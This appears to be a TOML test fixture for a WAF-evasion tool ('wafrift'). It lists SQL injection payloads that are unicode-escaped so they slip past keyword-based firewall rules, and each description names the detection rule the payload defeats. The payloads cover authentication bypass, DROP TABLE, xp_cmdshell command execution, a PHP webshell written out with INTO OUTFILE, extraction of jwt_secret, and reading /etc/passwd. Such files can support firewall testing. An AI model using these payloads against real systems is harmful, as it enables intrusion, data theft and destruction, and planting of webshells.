schema = 1
# SQL injection payloads pre-encoded with the `json_unicode_alnum` tamper —
# alphanumeric chars escaped as `\uXXXX`, punctuation/operators bare. The
# keyword fingerprint ("UNION", "SELECT", "DROP", "INTO") never appears
# in the wire bytes, but the origin's JSON / JS string-literal decoder
# rehydrates it at the application layer.
#
# Manual form:
#   wafrift evade --only tamper/json_unicode_alnum --payload "' OR 1=1--"
#
# Deployed via JSON body, e.g. `POST /api/login` with
#   { "username": "<payload>" }
# WAFs that scan raw bytes miss every literal-string keyword rule.

[[case]]
id = "json_unicode_alnum_or_1_1"
class = "sql"
payload = "' \\u004F\\u0052 \\u0031=\\u0031--"
description = "Classic OR 1=1 bypass — `OR` and the digit `1` escaped, quote and `=` bare. CRS literal-string rule for `OR 1=1` blind."

[[case]]
id = "json_unicode_alnum_union_select_basic"
class = "sql"
payload = "' \\u0055\\u004E\\u0049\\u004F\\u004E \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054 \\u006E\\u0075\\u006C\\u006C--"
description = "`UNION SELECT null` with both keywords escaped — defeats every WAF rule keyed on the `UNION SELECT` byte sequence."

[[case]]
id = "json_unicode_alnum_drop_table"
class = "sql"
payload = "'; \\u0044\\u0052\\u004F\\u0050 \\u0054\\u0041\\u0042\\u004C\\u0045 \\u0075\\u0073\\u0065\\u0072\\u0073;--"
description = "DDL injection — `DROP TABLE users` with keywords escaped. The semicolon/quote/dash structural markers stay visible so the payload still parses as data."

[[case]]
id = "json_unicode_alnum_sleep_blind"
class = "sql"
payload = "' \\u0041\\u004E\\u0044 \\u0053\\u004C\\u0045\\u0045\\u0050(\\u0035)--"
description = "Time-based blind: `AND SLEEP(5)` with keywords escaped, parens bare. CRS sleep-detector regex matches `SLEEP\\s*\\(` — fails when SLEEP is `\\u0053\\u004C\\u0045\\u0045\\u0050`."

[[case]]
id = "json_unicode_alnum_information_schema"
class = "sql"
payload = "' \\u0055\\u004E\\u0049\\u004F\\u004E \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054 \\u0074\\u0061\\u0062\\u006C\\u0065_\\u006E\\u0061\\u006D\\u0065 \\u0046\\u0052\\u004F\\u004D \\u0069\\u006E\\u0066\\u006F\\u0072\\u006D\\u0061\\u0074\\u0069\\u006F\\u006E_\\u0073\\u0063\\u0068\\u0065\\u006D\\u0061.\\u0074\\u0061\\u0062\\u006C\\u0065\\u0073--"
description = "Schema enumeration via information_schema.tables — every keyword AND identifier escaped. Underscores and dots stay bare so the dotted-identifier syntax parses. Probably the highest-value test case in this file."

[[case]]
id = "json_unicode_alnum_xp_cmdshell"
class = "sql"
payload = "'; \\u0045\\u0058\\u0045\\u0043 \\u0078\\u0070_\\u0063\\u006D\\u0064\\u0073\\u0068\\u0065\\u006C\\u006C '\\u006E\\u0065\\u0074 \\u0075\\u0073\\u0065\\u0072';--"
description = "MSSXP cmdshell — `EXEC`, `xp_cmdshell`, and the command string `net user` all escaped. The literal-substring rule for `xp_cmdshell` (CRS rule 942100 family) is byte-pattern; this defeats it."

[[case]]
id = "json_unicode_alnum_pg_pg_sleep"
class = "sql"
payload = "'; \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054 \\u0070\\u0067_\\u0073\\u006C\\u0065\\u0065\\u0070(\\u0033)--"
description = "Postgres time-based — `SELECT pg_sleep(3)`. Function name escaped; the parens and semicolon stay literal."

[[case]]
id = "json_unicode_alnum_into_outfile"
class = "sql"
payload = "' \\u0055\\u004E\\u0049\\u004F\\u004E \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054 \\u003C\\u003F\\u0070\\u0068\\u0070 \\u0073\\u0079\\u0073\\u0074\\u0065\\u006D($_\\u0047\\u0045\\u0054[\\u0030])\\u003F\\u003E \\u0049\\u004E\\u0054\\u004F \\u004F\\u0055\\u0054\\u0046\\u0049\\u004C\\u0045 '\\u002F\\u0076\\u0061\\u0072\\u002F\\u0077\\u0077\\u0077\\u002Fs.\\u0070\\u0068\\u0070'--"
description = "INTO OUTFILE webshell drop — PHP body AND destination path escaped. The `<?php` opener is reduced to `<?\\u0070\\u0068\\u0070` — `<?` stays bare (the structural lookahead some WAFs key on) but `php` is gone."

[[case]]
id = "json_unicode_alnum_jwt_table_dump"
class = "sql"
payload = "' \\u0055\\u004E\\u0049\\u004F\\u004E \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054 \\u006A\\u0077\\u0074_\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074 \\u0046\\u0052\\u004F\\u004D \\u0061\\u0070\\u0070_\\u0063\\u006F\\u006E\\u0066\\u0069\\u0067--"
description = "App-specific identifier targeting: `jwt_secret FROM app_config`. WAFs with broad keyword rules for `jwt_secret` (high-signal token) miss when the identifier is `\\u006A\\u0077\\u0074_\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074`."

[[case]]
id = "json_unicode_alnum_extractvalue"
class = "sql"
payload = "' \\u0041\\u004E\\u0044 \\u0045\\u0058\\u0054\\u0052\\u0041\\u0043\\u0054\\u0056\\u0041\\u004C\\u0055\\u0045(\\u0031,\\u0043\\u004F\\u004E\\u0043\\u0041\\u0054(0\\u0078\\u0037\\u0065,(\\u0053\\u0045\\u004C\\u0045\\u0043\\u0054 \\u0064\\u0061\\u0074\\u0061\\u0062\\u0061\\u0073\\u0065())))--"
description = "Error-based DB-name leak via EXTRACTVALUE+CONCAT. Composed with the `0x7e` hex marker the WAF often detects — but here `0x` stays bare, `7e` becomes escapes. Defeats `0x7e.*database\\s*\\(\\)` regex."

[[case]]
id = "json_unicode_alnum_load_file"
class = "sql"
payload = "' \\u0055\\u004E\\u0049\\u004F\\u004E \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054 \\u004C\\u004F\\u0041\\u0044_\\u0046\\u0049\\u004C\\u0045('\\u002F\\u0065\\u0074\\u0063\\u002F\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064')--"
description = "LFI via LOAD_FILE('/etc/passwd') — function AND path letters escaped. The `/etc/passwd` path-traversal regex blind because every alpha char is in `\\u` form."

[[case]]
id = "json_unicode_alnum_idempotent_passthrough"
class = "sql"
payload = "\\u0027 \\u004F\\u0052 \\u0031=\\u0031--"
description = "Negative-case: payload already in `\\uXXXX` form. The tamper's skip-pass mechanism must leave it unchanged on subsequent passes (proves second-pass cap test passes for this strategy)."
